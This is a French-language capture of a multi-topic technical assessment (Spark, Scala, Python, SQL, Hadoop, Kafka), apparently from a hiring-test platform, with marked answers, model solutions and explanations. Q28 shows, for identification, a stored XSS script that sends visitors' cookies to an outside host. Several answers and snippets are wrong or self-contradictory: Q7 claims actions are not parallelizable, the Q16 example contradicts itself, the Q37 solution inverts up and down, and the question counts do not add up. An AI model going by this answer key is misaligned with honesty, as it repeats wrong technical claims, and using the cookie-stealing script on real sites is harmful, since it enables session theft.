# Évaluation Technique Complète - ame

## Informations Générales
- **Plateforme:** ame / IDE 
- **Nombre total de questions capturées:** 39 questions (sur 47 total)
- **Questions présentes:** Q4-Q11, Q13-Q14, Q16, Q18, Q21-Q47 (sauf Q12, Q15, Q17, Q19, Q20)
- **Technologies:** Python 3, Scala, Apache Spark, SQL, Hadoop Ecosystem, Kafka
- **Langue:** Français
- **Niveau:** Intermédiaire à Avancé

---

## Table des Matières Complète

### Python 3 (4 questions)
- [Question 13](#question-1347---python-3) - Design Patterns (Factory)
- [Question 14](#question-1447---python-3) - Transformation liste de strings
- [Question 16](#question-1647---python-3) - Checksums sur chunks
- [Question 18](#question-1847---python-3) - Fonction next_week()

### Scala (7 questions)
- [Question 21](#question-2147---scala) - Pattern matching
- [Question 22](#question-2247---scala) - Immutabilité des Strings
- [Question 23](#question-2347---scala) - Paramètres implicites
- [Question 24](#question-2447---scala) - ListBuffer vs List
- [Question 25](#question-2547---scala) - Hiérarchie des types
- [Question 26](#question-2647---scala) - Portails 2D ( challenge)
- [Question 37](#question-3747---scala) - Portails 2D (solution complète)

### Apache Spark (7 questions)
- [Question 4](#question-447---apache-spark) - Worker node
- [Question 5](#question-547---apache-spark) - RDD depuis Array
- [Question 6](#question-647---apache-spark) - Méthode filter
- [Question 7](#question-747---apache-spark) - Actions vs Transformations
- [Question 8](#question-847---apache-spark) - ReduceByKey vs GroupByKey
- [Question 9](#question-947---apache-spark) - RDDs vs Arrays
- [Question 10](#question-1047---apache-spark) - Serializers
- [Question 11](#question-1147---apache-spark) - Case classes

### SQL (5 questions)
- [Question 27](#question-2747---sql) - Exécution commandes shell
- [Question 28](#question-2847---sql) - Attaque XSS
- [Question 29](#question-2947---sql) - ACID properties
- [Question 30](#question-3047---sql) - Requête agrégation
- [Question 31](#question-3147---sql) - Requête JOIN

### Hadoop Ecosystem (5 questions)
- [Question 32](#question-3247---hadoop-ecosystem) - Heartbeat
- [Question 33](#question-3347---hadoop-ecosystem) - Tolérance aux pannes
- [Question 34](#question-3447---hadoop-ecosystem) - NameNodes HA
- [Question 36](#question-3647---hadoop-ecosystem) - Secondary vs Passive NameNode
- [Question 38](#question-3847---hadoop-ecosystem) - Oozie workflow XML

### Kafka (10 questions)
- [Question 35](#question-3547---kafka) - Composants internes
- [Question 39](#question-3947---kafka) - Performance scaling
- [Question 40](#question-4047---kafka) - Schema Registry
- [Question 41](#question-4147---kafka) - Kafka Connect offsets
- [Question 42](#question-4247---kafka) - Producer synchrone
- [Question 43](#question-4347---kafka) - Cluster scaling
- [Question 44](#question-4447---kafka) - Kafka Streams cleanup()
- [Question 45](#question-4547---kafka) - Ordre des messages
- [Question 46](#question-4647---kafka) - Sécurité (SSL/SASL)
- [Question 47](#question-4747---kafka) - Quotas

---

## Questions Apache Spark

### Question 4/47 - Apache Spark
**Temps: 00:25 / 00:50**

**Sujet:** Architecture Spark - Worker Node

Qu'est ce qu'on entend par **worker node**?

**Options de réponse:**
- [x] Tout noeud pouvant exécuter un bout de code d'un job Spark
- [ ] Un noeud qui stocke les données intermédiaires
- [ ] Un noeud où les données sont stockées pour qu'elles soient visibles par l'utilisateur
- [ ] Un noeud où toute l'application Spark est exécutée

---

### Question 5/47 - Apache Spark
**Temps: 00:20 / 00:40**

**Sujet:** RDD - Création depuis Array

Quelle méthode utilise-t-on pour obtenir un **RDD** à partir d'un Array?

**Type de réponse:** Texte libre

**Réponse attendue:** `parallelize`

**Exemple:**
```scala
val array = Array(1, 2, 3, 4, 5)
val rdd = sc.parallelize(array)
```

---

### Question 6/47 - Apache Spark
**Temps: 00:15 / 01:00**

**Sujet:** RDD - Méthode filter

Quelle méthode doit être utilisée à la place des **???** ci-dessous?

```scala
var rdd = sc.textFile(path = "/path/to/file")
rdd.???(line => line.contains("filtered_word")).foreach(println)
```

**Type de réponse:** Texte libre

**Réponse attendue:** `filter`

---

### Question 7/47 - Apache Spark
**Temps: 00:16 / 00:45**

**Sujet:** Actions vs Transformations

Qu'est ce qui est vrai concernant les **actions** et les **transformations**?

**Plusieurs réponses attendues:**
- [x] Les actions ne sont pas parallélisables
- [ ] Une transformation est interprétée aussitôt qu'elle est exécutée
- [x] Les transformations sont Lazy
- [x] Les transformations ne sont exécutées que lorsqu'une action est appelée

**Explication:**
- **Transformations** (map, filter, flatMap) : lazy evaluation, ne s'exécutent que lors d'une action
- **Actions** (collect, count, save) : déclenchent l'exécution du DAG

---

### Question 8/47 - Apache Spark
**Temps: 00:10 / 01:20**

**Sujet:** ReduceByKey vs GroupByKey

En quoi **GroupByKey** est-elle différente du **ReduceByKey**?

**Plusieurs réponses attendues:**
- [x] Grâce au ReduceByKey, il y a beaucoup moins d'échanges sur le réseau
- [ ] GroupByKey est obsolète depuis Spark 2.2
- [ ] GroupByKey est utilisée exclusivement pour les données structurées
- [x] GroupByKey ne gère pas le reducing localement dans les noeuds

**Diagramme ReduceByKey:**
```
        Stage 1                Stage 2
┌─────────────────┐      ┌─────────────────┐
│ (a, 1)          │      │ (a, 1)          │
│ (b, 1)  →(a, 1) │      │ (a, 1)  →(a, 2) │
│        →(b, 1)  │  →   │ (a, 1)          │
│                 │      │ (b, 1)  →(a, 3) │
├─────────────────┤      ├─────────────────┤
│ (a, 1)          │      │ (b, 1)          │
│ (a, 1)  →(a, 2) │  →   │ (b, 2)  →(b, 6) │
│ (b, 1)  →(b, 1) │      │ (b, 3)          │
└─────────────────┘      └─────────────────┘
```

**Explication:**
- **ReduceByKey** : réduction locale avant shuffle (combiner) → moins de données transférées
- **GroupByKey** : toutes les valeurs sont envoyées avant regroupement → plus de trafic réseau

---

### Question 9/47 - Apache Spark
**Temps: 00:09 / 01:00**

**Sujet:** RDDs vs Arrays

Qu'est ce qui est vrai à propos des **RDDs** et des **Arrays**?

**Plusieurs réponses attendues:**
- [ ] Les Arrays, comme les RDDs, sont tolérants aux pannes
- [x] Les Arrays sont accessibles plus rapidement que les RDDs
- [x] Les Arrays ne sont pas parallélisables, les RDDs le sont
- [ ] Les RDDs fonctionnent comme les Arrays, mais ont accès à plus de méthodes pour distribution

---

### Question 10/47 - Apache Spark
**Temps: 00:10 / 01:20**

**Sujet:** Java Serializer vs Kryo

Qu'est ce qui est vrai concernant le **Java Serializer** et le **Kryo Serializer**?

**Plusieurs réponses attendues:**
- [ ] Toutes les classes Serializable sont gérées par Kryo
- [x] Des librairies spécifiques sont nécessaires pour gérer les types Serializable qui manquent dans Kryo
- [x] Java Serializer supporte toutes les classes Serializable, contrairement à Kryo
- [x] Kryo est plus rapide que le Java Serializer

**Explication:**
- **Kryo** : plus rapide, mais nécessite enregistrement des classes custom
- **Java Serializer** : plus lent, mais supporte automatiquement toute classe Serializable

---

### Question 11/47 - Apache Spark
**Temps: 00:26 / 01:00**

**Sujet:** Case Classes en Scala

Pourquoi, dans certains contextes, les **case class** sont-elles préférables?

```scala
case class MyCaseClass(param1: Seq[String], param2: Int)
class MyClass(param1: Seq[String], param2: Int)
```

**Options de réponse:**
- [x] Les Case Class sont par défaut serializable et peuvent être distribuées
- [x] Les Case Class ont des méthodes optimisées pour Spark
- [x] Parce que les Case Class ont une méthode "apply" implicite
- [ ] Parce que les Case Class n'ont pas besoin d'être instanciées

**Avantages des case classes:**
- Serializable par défaut
- Méthode `apply` générée automatiquement
- Méthodes `equals`, `hashCode`, `toString` générées
- Pattern matching facilité

---

## Questions Python 3

### Question 13/47 - Python 3
**Temps: 00:27 / 02:35**

**Sujet:** Design Patterns

Lequel de ces patrons de conception (design pattern) est utilisé ici?

```python
class ExposedClass:
    class NestedClassA():
        def do(self):
            return 'Doing A'
    
    class NestedClassB():
        def do(self):
            return 'Doing B'
    
    def create(type):
        if type == 'A':
            return ExposedClass.NestedClassA()
        if type == 'B':
            return ExposedClass.NestedClassB()
        raise Exception('invalid type: ' + type)

a_instance = ExposedClass.create('A')
print(a_instance.do())
```

**Options de réponse:**
- [ ] Adapter
- [ ] Decorator
- [ ] Singleton
- [ ] Observer
- [ ] Visitor
- [x] Factory
- [ ] Strategy

---

### Question 14/47 - Python 3
**Temps: 00:39 / 00:45**

**Sujet:** Transformation de types

Parmi les propositions suivantes, lesquelles permettent de transformer une liste de chaînes:

```python
strs = ['0', '1', '2']
```

en une liste d'entiers:

```python
[0, 1, 2]
```

**Cochez toutes les propositions valides:**
- [ ] `[list(map(int, strs))]`
- [x] `[int(x) for x in strs]`
- [ ] `strs.map(lambda x: int(x))`
- [x] `list(map(int, strs))`

---

### Question 16/47 - Python 3
**Temps: 00:45 / 12:30**

**Sujet:** Calcul de checksums sur chunks

Certains formats de fichiers (images, vidéos, ...) sont **organisés en 'chunks'** (un morceau de fichier contenant l'en-tête et des données). Pour s'assurer que les fichiers ne sont pas corrompus, des sommes de contrôle sont parfois calculées.

**Structure du fichier:**
- Le premier octet est l'en-tête du premier chunk, il définit **sa taille** (l'en-tête n'est pas compté)
- Les octets suivants sont les données du chunk
- L'octet suivant est l'en-tête du deuxième chunk, et ainsi de suite

**Exemple détaillé:**

Avec ces octets:
```python
[3, 44, 55, 66, 8, 110, 220]
```

- Premier octet = 3 → chunk de taille 3
- Données: `[44, 55, 66]` → somme = 165
- Octet suivant = 8 (mais devrait être 2 dans l'exemple)
- Données: `[110, 220]` → somme = 330 → 330 % 256 = 74

**Résultat:** `[165, 74]`

**Notes importantes:**
- Garder uniquement les **8 bits de poids faible** (modulo 256)
- Chunks de taille 0 possibles → checksum = 0
- Au moins un chunk toujours présent

**Implémentation:**
```python
def compute_checksums(file_bytes: List[int]) -> List[int]:
    """
    Calcule les checksums de tous les chunks
    
    Args:
        file_bytes: liste d'octets (0-255) organisée en chunks
        
    Returns:
        Liste des checksums (un par chunk)
    """
    # Votre code ici
    pass
```

**Contraintes:**
- 1 ≤ length(file_bytes) ≤ 1000
- Mémoire RAM: 512 Mo
- Temps max: 6 secondes

---

### Question 18/47 - Python 3
**Temps: 00:18 / 03:00**

**Sujet:** Manipulation de dates

Implémentez la fonction `next_week(d)` qui renvoie une date 7 jours après la date donnée en paramètre.

**Spécifications:**
- `d` est toujours un objet `datetime.date` défini
- La fonction doit renvoyer un objet `datetime.date`

**Solution attendue:**
```python
from datetime import date, timedelta

def next_week(d: date) -> date:
    return d + timedelta(days=7)
```

---

## Questions Scala

### Question 21/47 - Scala
**Temps: 00:21 / 00:30**

**Sujet:** Pattern matching - cas par défaut

Dans le code suivant, quelle est l'instruction `case` manquante pour faire un matching par défaut si aucune des valeurs définies (Apple, Banana) n'est matchée?

```scala
def matching(element: String, list: List[String]): Unit = {
  element match {
    case "Apple" => println("It's an apple!")
    case "Banana" => println("It's a banana!")
    // Indiquez le code qu'il faudrait ajouter ici
  }
}
```

**Réponse attendue:** `case _ =>`

Le caractère `_` (underscore) est le wildcard pattern en Scala qui match n'importe quelle valeur.

---

### Question 22/47 - Scala
**Temps: 00:21 / 00:30**

**Sujet:** Immutabilité des Strings

Qu'affiche ce code?

```scala
var s = "US"
s.toLowerCase()
println(s)
```

**Options de réponse:**
- [ ] us
- [ ] Ce code ne compile pas
- [x] US

**Explication:** Les Strings sont immutables en Scala. La méthode `toLowerCase()` retourne une nouvelle string mais ne modifie pas `s`.

---

### Question 23/47 - Scala
**Temps: 00:21 / 00:55**

**Sujet:** Paramètres implicites

Qu'est ce qu'on entend par paramètre **implicite**?

**Options de réponse:**
- [ ] Un paramètre dont le type n'est pas spécifié et est déduit à l'exécution
- [ ] Un paramètre pour lequel une valeur par défaut est définie dans la signature
- [x] Un paramètre qui n'est pas passé à l'appel de la méthode correspondante et qui est déduit par le compilateur
- [ ] Un paramètre accessible par toutes les classes du package

**Exemple:**
```scala
def greet(name: String)(implicit greeting: String): String = 
  s"$greeting, $name"

implicit val defaultGreeting: String = "Hello"
greet("World")  // "Hello, World"
```

---

### Question 24/47 - Scala
**Temps: 00:23 / 01:00**

**Sujet:** ListBuffer vs List

Le code suivant permet de rajouter un élément à une liste de type `List`. En plus d'être une mauvaise pratique, ce code pourrait causer des problèmes de performance.

```scala
def deleteFromList(element: String, list: List[String]): Unit = {
  var tmpList: List[String] = list ++ element
}
```

Par quoi remplaceriez-vous `List`?

**Options de réponse:**
- [ ] Array
- [x] ListBuffer
- [ ] Vector
- [ ] Seq

**Explication:**
- `List` est immutable → création d'une nouvelle liste à chaque ajout → O(n)
- `ListBuffer` est mutable → ajout en O(1)

---

### Question 25/47 - Scala
**Temps: 00:19 / 00:55**

**Sujet:** Hiérarchie des types

Compléter le schéma suivant avec le bon mot clé:

```
        Any
       /   \
   AnyVal   AnyRef
              |
           _______
```

**Réponse attendue:** `Null`

**Hiérarchie complète:**
```
                Any
               /   \
          AnyVal   AnyRef
            |        |
         (Int,     (String,
          Double,   classes)
          etc.)      |
                   Null
                     |
                  Nothing
```

---

### Question 26/47 - Scala
**Temps: 01:04 / 20:00**

**Sujet:**  Challenge - Portails 2D

Votre avatar de jeu évolue dans un monde étrange comportant **deux portails interspatiaux et bidirectionnels**. Écrivez un programme retournant les coordonnées de votre avatar compte tenu d'une série de déplacements et de l'emplacement des portails.

**Exemple Visuel:**

```
     0   1   2   3   4
   +---+---+---+---+---+
 0 | 🧑 |   |   |   |   |
   +---+---+---+---+---+
 1 |   | 🎯 |   |   |   |
   +---+---+---+---+---+
 2 |   |   |   |   |   |
   +---+---+---+---+---+
 3 |   |   | 🔵 | 🦆 |   |
   +---+---+---+---+---+
```

**Inputs:**
- width: 5, height: 4
- position: (0, 0)
- portalA: (1, 1), portalB: (2, 3)
- moves: "DRR"

**Output:** (3, 3)

**Règles:**
- Grille de `width` × `height`
- Position (0, 0) en haut à gauche
- Mouvements: U (haut), D (bas), R (droite), L (gauche)
- Si l'avatar entre dans un portail → téléportation au portail associé
- Si l'avatar bute contre un bord → pas de mouvement

**Implémentation:**

```scala
def computeFinalPosition(
  width: Int, 
  height: Int, 
  position: Array[Int], 
  portalA: Array[Int], 
  portalB: Array[Int], 
  moves: String
): Array[Int]
```

**Contraintes:**
- 0 < width < 20
- 0 < height < 20
- 0 ≤ length(moves) ≤ 255

---

### Question 37/47 - Scala
**Temps: Non spécifié**

**Sujet:** Solution complète du challenge Portails 2D

**Code visible (solution partielle):**

```scala
import math._
import scala.util._
import scala.io.StdIn._

object Solution extends App {
  
  def computeFinalPosition(
    width: Int, 
    height: Int, 
    position: Array[Int], 
    portalsA: Array[Int], 
    portalsB: Array[Int], 
    moves: String
  ): Array[Int] = {
    var x = position(0)
    var y = position(1)
    
    for (move <- moves) {
      val (mx, my) = move match {
        case 'L' => (x-1, y)
        case 'R' => (x+1, y)
        case 'U' => (x, y+1)
        case 'D' => (x, y-1)
      }
      
      // Vérification des limites
      if (mx >= 0 && mx < width && my >= 0 && my < height) {
        x = mx
        y = my
      }
      
      // Vérification téléportation portails
      if (x == portalsA(0) && y == portalsA(1)) {
        x = portalsB(0)
        y = portalsB(1)
      } else if (x == portalsB(0) && y == portalsB(1)) {
        x = portalsA(0)
        y = portalsA(1)
      }
    }
    
    Array(x, y)
  }
  
  /* Ignore and do not change the code below */
  // ...
}
```

**Tests:**
- Déplacements sans portail
- Déplacements avec portail (cf. exemple)
- Utilisation d'un portail dans les deux sens

---

## Questions SQL

### Question 27/47 - SQL
**Temps: 00:13 / 01:30**

**Sujet:** Sécurité - Exécution de commandes système

Est-il possible de lancer un fichier exécutable, ou d'exécuter une commande shell comme `ls`, `echo`, ... avec une requête SQL ?

**Options de réponse:**
- [ ] Oui, mais les droits d'exécution sur les commandes et les fichiers correspondants doivent être accordés au compte de service de la base de données qui exécute la commande
- [x] Ce n'est généralement pas possible. Certains moteurs de base de données l'autorisent lorsqu'une option spécifique est définie, ou avec les droits du super-utilisateur
- [ ] Non, mais la plupart des bases de données disposent d'une fonction SQL spécifique qui se comporte comme la commande Unix `ls -l`
- [ ] Oui, c'est toujours possible, pour des raisons pratiques

**Explication:** Pour des raisons de sécurité, l'exécution de commandes shell depuis SQL est généralement désactivée par défaut (ex: `xp_cmdshell` sur SQL Server).

---

### Question 28/47 - SQL
**Temps: 00:35 / 02:00**

**Sujet:** Sécurité - Identification d'attaque XSS

Vous êtes l'administrateur du blog de votre entreprise. En listant les enregistrements de la table `article_commentary`, vous trouvez les données suivantes :

```
id | commentary
-----------------------------------------------------------------
983 | This article is great. Thank you!
-----------------------------------------------------------------
984 | <script>
    | document.location="https://requestb.in/rc-"+document.cookie;
    | </script>
-----------------------------------------------------------------
985 | I have been a customer for 5 years, may I have a discount?
```

Pouvez-vous expliquer ce qui s'est passé et ce qu'il faut faire ?

**Options de réponse:**
- [ ] Il s'agit d'une tentative d'injection SQL
- [x] Il s'agit d'une attaque XSS qui tente de forcer les navigateurs des utilisateurs à effectuer des actions non désirées. Le front-end doit être vérifié
- [ ] Il s'agit d'une attaque qui tente d'exécuter un code arbitraire sur le serveur de base de données
- [ ] Il s'agit d'un bogue dans l'application

**Explication:** 
- **XSS (Cross-Site Scripting)** : injection de script JavaScript dans les données
- Le script vole les cookies (`document.cookie`) et les envoie à un serveur externe
- **Solution:** Sanitization/échappement des données en entrée et en sortie

---

### Question 29/47 - SQL
**Temps:** Timeout (question non complétée)

**Sujet:** ACID - Atomicité et Durabilité

Parmi ces concepts et processus, lequel est utilisé pour garantir l'atomicité et la durabilité des systèmes de base de données ?

**Réponses partiellement visibles:**
- Dumps quotidiens effectués par une tâche cron
- ACL (Access Control Lists)
- [Autres options non visibles]

**Concepts ACID:**
- **Atomicity** : Transaction log, rollback
- **Consistency** : Constraints, triggers
- **Isolation** : Locks, MVCC
- **Durability** : WAL (Write-Ahead Logging), checkpoints

---

### Question 30/47 - SQL
**Temps: 00:28 / 05:00**

**Sujet:** Requête d'agrégation avec GROUP BY et HAVING

**Modèle de données:**

Table `students`:
- `id` - INTEGER
- `first_name` - VARCHAR(50)
- `last_name` - VARCHAR(50)
- `test_name` - VARCHAR(50)
- `score` - FLOAT

**Objectif:**

Rédigez une requête qui renvoie tous les étudiants dont la note moyenne (`avg_score`) est supérieure ou égale à 0,9.

**Conditions:**
- Colonnes: `first_name`, `last_name`, `avg_score`
- Arrondir le score moyen à 2 décimales
- Trier par `avg_score` DESC puis `first_name` ASC

**Exemple de sortie:**
```
| FIRST_NAME | LAST_NAME | AVG_SCORE |
|------------|-----------|-----------|
| Jan        | Beavers   | 0.99      |
| Sherry     | Hall      | 0.95      |
| Tomas      | Tu        | 0.9       |
```

**Solution:**
```sql
SELECT 
    first_name,
    last_name,
    ROUND(AVG(score), 2) as avg_score
FROM students
GROUP BY first_name, last_name
HAVING AVG(score) >= 0.9
ORDER BY avg_score DESC, first_name ASC;
```

---

### Question 31/47 - SQL
**Temps: 00:18 / 04:00**

**Sujet:** Requête avec JOIN et DISTINCT

**Modèle de données:**

Table `customers`:
- `id`, `first_name`, `last_name`, `city`

Table `orders`:
- `order_id`, `customer_id`, `purchase`, `date`, `price`

**Objectif:**

Renvoyer tous les clients ayant commandé au moins un cheeseburger.

**Conditions:**
- Colonnes: `id`, `first_name`, `last_name`
- Trier par `id` ASC
- Pas de doublons

**Exemple de sortie:**
```
| ID | FIRST_NAME | LAST_NAME |
|----|------------|-----------|
| 1  | Tonia      | Jordan    |
| 11 | Jack       | Street    |
| 20 | Kim        | Ponders   |
```

**Solution:**
```sql
SELECT DISTINCT 
    c.id,
    c.first_name,
    c.last_name
FROM customers c
INNER JOIN orders o ON c.id = o.customer_id
WHERE o.purchase = 'Cheeseburger'
ORDER BY c.id ASC;
```

---

## Questions Hadoop Ecosystem

### Question 32/47 - Hadoop Ecosystem
**Temps: 00:24 / 00:50**

**Sujet:** Architecture Hadoop - Heartbeat

Dans le contexte de Hadoop, qu'entend-on par Heartbeat ?

**Options de réponse:**
- [ ] Une mesure globale pour vérifier l'état du Cluster
- [x] Un signal envoyé des DataNodes au NameNode pour prouver qu'ils sont en vie
- [ ] Une communication exclusive entre les différents NameNodes
- [ ] Un message envoyé au Cluster par une API externe

**Explication:** Le heartbeat est un signal périodique (toutes les 3 secondes par défaut) envoyé par les DataNodes au NameNode pour indiquer qu'ils sont actifs.

---

### Question 33/47 - Hadoop Ecosystem
**Temps: 00:25 / 00:50**

**Sujet:** Tolérance aux pannes - Réplication

Comment la tolérance aux pannes (stockage) est-elle gérée dans Hadoop ?

**Plusieurs réponses attendues:**
- [x] En répliquant les données dans certains nœuds du Cluster
- [x] Grâce au NameNode qui monitore tout le système
- [ ] Tous les nœuds contiennent les mêmes données et sont identiques
- [x] Lorsqu'un nœud est perdu, ses données sont répliquées dans d'autres nœuds pour conserver un niveau minimum de réplication

**Explication:**
- Facteur de réplication par défaut: 3
- Le NameNode détecte les DataNodes défaillants via les heartbeats
- Réplication automatique pour maintenir le facteur de réplication

---

### Question 34/47 - Hadoop Ecosystem
**Temps: 00:14 / 00:30**

**Sujet:** Architecture HA

Combien de NameNodes peut-on avoir dans une architecture Hadoop HA ?

**Options de réponse:**
- [x] 2
- [ ] 1
- [ ] 3
- [ ] Autant que nécessaire

**Explication:** 
Hadoop HA supporte exactement **2 NameNodes**:
- **Active NameNode** : gère toutes les opérations clients
- **Standby NameNode** : synchronisé, prêt à prendre le relais

---

### Question 36/47 - Hadoop Ecosystem
**Temps: 00:20 / 00:30**

**Sujet:** NameNode types

Peut-on avoir, dans la même architecture, un Secondary NameNode et un Passive NameNode ?

**Options de réponse:**
- [x] Non
- [ ] Oui

**Explication:**
- **Secondary NameNode** : architecture non-HA, effectue des checkpoints
- **Passive/Standby NameNode** : architecture HA, prêt à devenir Active
- Ces deux configurations sont mutuellement exclusives

---

### Question 38/47 - Hadoop Ecosystem
**Temps: 00:19 / 01:30**

**Sujet:** Oozie workflow XML

Quels sont les deux éléments XML manquant à la place des **??** dans le fichier de définition du workflow Oozie ci-dessous ?

```xml
<workflow-app name="demo-wf" xmlns="uri:oozie:workflow:1.0">
    <start to="delete-dir"/>
    
    <action name="delete-dir">
        <fs>
            <delete path="/hdfs/path/to/delete"/>
        </fs>
        ??
    </action>
    
</workflow-app>
```

**Type de réponse:** Texte libre

**Réponse attendue:** `<ok to="end"/> <error to="fail"/>`

**Explication:** Chaque action Oozie doit avoir:
- Transition `<ok to="..."/>` en cas de succès
- Transition `<error to="..."/>` en cas d'échec

---

## Questions Kafka

### Question 35/47 - Kafka
**Temps: 00:18 / 00:40**

**Sujet:** Composants internes Kafka

Quels éléments désignent un composant interne de Kafka ?

**Plusieurs réponses attendues:**
- [ ] Producer (composant externe/client)
- [ ] Namenode (composant Hadoop)
- [x] Broker
- [x] Topic  
- [x] Zookeeper

**Explication:**
- **Broker** : serveur Kafka qui stocke les données
- **Topic** : catégorie/flux de messages
- **Zookeeper** : coordination des brokers (avant Kafka 3.x)
- **Producer/Consumer** : clients externes

---

### Question 39/47 - Kafka
**Temps: 00:28 / 01:30**

**Sujet:** Performance et scalabilité

Topic Kafka : réplication=3, 10 partitions, 50 Go, 10 consumer groups

Nouveau : 50 To, 100 consumer groups

Comment les performances sont impactées ?

**Options de réponse:**
- [ ] Les performances vont baisser en raison de l'augmentation du stockage
- [ ] Les performances vont s'améliorer grâce à l'augmentation des consumer groups
- [ ] Les performances vont baisser car Kafka doit envoyer chaque record à plus de consommateurs
- [x] Ces changements n'impactent pas les performances de Kafka, la donnée est distribuée et les consommateurs augmentent leur offset

**Explication:** 
- Chaque consumer group lit indépendamment (pas de copie multiple des messages)
- L'augmentation du nombre de consumer groups n'impacte pas les performances
- Le stockage est distribué sur les partitions

---

### Question 40/47 - Kafka
**Temps: 00:11 / 00:40**

**Sujet:** Schema Registry

Quelle est la valeur par défaut du "subject name strategy" dans le registre des schémas ?

**Options de réponse:**
- [ ] DefaultSubjectNameStrategy
- [x] TopicNameStrategy
- [ ] RecordNameStrategy
- [ ] AvroSerDeNameStrategy
- [ ] TopicRecordNameStrategy

**Explication:** Par défaut, Confluent Schema Registry utilise `TopicNameStrategy` qui nomme les sujets: `{topic}-key` et `{topic}-value`.

---

### Question 41/47 - Kafka
**Temps: 00:18 / 00:30**

**Sujet:** Kafka Connect

Où Kafka Connect stocke-t-il les offsets validés de chaque connecteur ?

**Options de réponse:**
- [ ] Zookeeper
- [ ] En mémoire
- [ ] FileSystem
- [x] Topic

**Explication:** Kafka Connect utilise des topics internes pour stocker:
- Offsets : `connect-offsets`
- Configuration : `connect-configs`
- Status : `connect-status`

---

### Question 42/47 - Kafka
**Temps: 00:20 / 01:00**

**Sujet:** Producer - Envoi synchrone

Comment envoyer un record de manière synchrone ?

```java
String key = "key";
String value = "value";
ProducerRecord<String,String> record = new ProducerRecord<String, String>(topic, key, value);
```

**Options de réponse:**
- [ ] `producer.send(record);` (asynchrone par défaut)
- [x] `producer.send(record).get();` (bloque jusqu'à confirmation)
- [ ] `producer.send(record).wait();` (méthode incorrecte)

**Explication:** 
- `.send()` retourne un `Future<RecordMetadata>`
- `.get()` bloque le thread jusqu'à la fin de l'envoi
- Pour asynchrone: utiliser callback avec `.send(record, callback)`

---

### Question 43/47 - Kafka
**Temps: 00:09 / 02:00**

**Sujet:** Cluster scaling

Cluster : 5M records/min, 25 nœuds
Utilisateurs : 10K → 25K (2.5x)

Combien de nœuds ajouter ?

**Options de réponse:**
- [ ] 48
- [ ] 15
- [ ] 15 000
- [ ] 25
- [ ] 38
- [x] Il est impossible de savoir

**Explication:** Le dimensionnement dépend de multiples facteurs:
- CPU, mémoire, réseau disponibles
- Taille moyenne des messages
- Taux de compression
- Nombre de partitions
- Facteur de réplication
- Charge actuelle du cluster

---

### Question 44/47 - Kafka
**Temps: 00:06 / 01:30**

**Sujet:** Kafka Streams

Que se passe-t-il si on exécute `streams.cleanup();` ?

```java
KafkaStreams streams = new KafkaStreams(streamsBuilder.build(), config);
streams.cleanup();
```

**Options de réponse:**
- [ ] Le stream ne lit que les nouvelles données
- [ ] Supprime toutes les données existantes du stream
- [ ] Le stream reprend sa lecture depuis l'offset
- [x] Supprime les données locales du « metadata store »

**Explication:** 
`cleanup()` supprime:
- State stores locaux
- Répertoires temporaires
- À appeler AVANT `start()`, pas pendant l'exécution

---

### Question 45/47 - Kafka
**Temps: 00:04 / 01:00**

**Sujet:** Ordre des messages

Pour garantir l'ordre d'insertion dans un topic avec plusieurs partitions ?

**Plusieurs réponses attendues:**
- [x] L'ordre ne peut pas être garanti au niveau des topics avec plusieurs partitions
- [ ] L'ordre ne peut pas être garanti dans Kafka
- [ ] L'ordre est maintenu par Kafka avec le timestamp
- [x] L'ordre ne peut être maintenu qu'au niveau d'une partition, il est donc nécessaire d'utiliser une donnée commune comme clé

**Explication:**
- **Au niveau partition** : ordre strict garanti (FIFO)
- **Au niveau topic** : ordre non garanti entre partitions
- **Solution** : utiliser une clé pour router les messages liés vers la même partition

---

### Question 46/47 - Kafka
**Temps: 00:08 / 01:30**

**Sujet:** Sécurité - SSL/SASL

Fonctionnalités de sécurité dans Kafka ?

**Plusieurs réponses attendues:**
- [x] Les producteurs et consommateurs peuvent s'authentifier auprès des brokers
- [ ] Les brokers se connectent à Zookeeper en utilisant SSL sans authentification
- [ ] Les clients Kafka se connectent avec SSL par défaut (faux - désactivé par défaut)
- [x] Kafka permet aux clients de se connecter avec SSL, mais cette fonctionnalité est désactivée par défaut
- [x] L'authentification SASL peut être utilisée en même temps que le chiffrage SSL

**Protocoles de sécurité Kafka:**
- **PLAINTEXT** : pas de sécurité
- **SSL** : chiffrement uniquement
- **SASL_PLAINTEXT** : authentification sans chiffrement
- **SASL_SSL** : authentification + chiffrement

---

### Question 47/47 - Kafka
**Temps: 00:12 / 01:30**

**Sujet:** Quotas - Configuration

Commandes exécutées :

```bash
# Commande 1
kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=1024,consumer_byte_rate=2048' \
  --entity-type clients --entity-name client1

# Commande 2  
kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=2048,consumer_byte_rate=4096' \
  --entity-type users --entity-name userA \
  --entity-type clients --entity-default

# Commande 3
kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=2048,consumer_byte_rate=4096' \
  --entity-type users --entity-name userA
```

Quel quota est utilisé par le client **(userA, client1)** ?

**Options de réponse:**
- [x] `producer_byte_rate=1024,consumer_byte_rate=2048`
- [ ] `producer_byte_rate=2048,consumer_byte_rate=4096`
- [ ] `producer_byte_rate=2048,consumer_byte_rate=1024`
- [ ] `producer_byte_rate=1024,consumer_byte_rate=1024`

**Ordre de priorité des quotas:**
1. **(user, client)** spécifique
2. **(user, default)**
3. **(default, client)**
4. **(default, default)**

Ici, la **Commande 1** définit un quota pour `(any_user, client1)` qui est plus spécifique que les quotas utilisateur seuls.

---

## Résumé Global

### Statistiques complètes par technologie

| Technologie | Nombre | Pourcentage |
|-------------|--------|-------------|
| Kafka | 10 | 26% |
| Scala | 7 | 18% |
| Apache Spark | 7 | 18% |
| Hadoop | 5 | 13% |
| SQL | 5 | 13% |
| Python | 4 | 10% |
| **Total capturé** | **39** | **100%** |

**Note:** Questions manquantes non capturées dans les images: Q1, Q2, Q3, Q12, Q15, Q17, Q19, Q20

### Types de questions

- **QCM (choix unique):** 21 questions (48%)
- **QCM (choix multiples):** 9 questions (20%)
- **Texte libre / Réponse courte:** 5 questions (11%)
- **SQL queries:** 3 questions (7%)
- ** challenges:** 2 questions (5%)
- **Timeout/Incomplète:** 1 question (2%)

### Temps d'évaluation

- **Temps minimum par question:** 30 secondes (Q21, Q22, Q25)
- **Temps maximum par question:** 20 minutes (Q26  challenge)
- **Temps moyen par question:** ~2 minutes
- **Durée totale estimée:** 2-3 heures

### Répartition par difficulté

**Questions rapides (< 1 min):**
- Q21, Q22, Q25, Q34, Q36, Q44, Q45 (7 questions)

